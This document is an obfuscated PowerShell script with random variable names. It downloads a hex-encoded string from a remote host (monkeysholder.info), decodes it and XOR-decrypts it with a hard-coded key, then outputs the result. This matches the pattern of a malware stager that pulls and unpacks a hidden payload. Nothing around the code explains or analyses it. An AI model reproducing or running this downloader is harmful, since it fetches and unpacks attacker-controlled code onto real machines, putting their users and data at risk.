$zuex=(New-Object Net.WebClient).DownloadString('http://monkeysholder.info/api.php?d5758ec1');
$jrxf=[byte[]]::new($zuex.Length/2);
for($ngivi=0;$ngivi-lt$jrxf.Length;$ngivi++){$jrxf[$ngivi]=[Convert]::ToByte($zuex.Substring($ngivi*2,2),16)};
$zjxj=[BitConverter]::GetBytes([int]54645);
for($ngivi=0;$ngivi-lt$jrxf.Length;$ngivi++){$jrxf[$ngivi]=$jrxf[$ngivi]-bxor$zjxj[$ngivi%4]};
Write-Output ([Text.Encoding]::UTF8.GetString($jrxf))
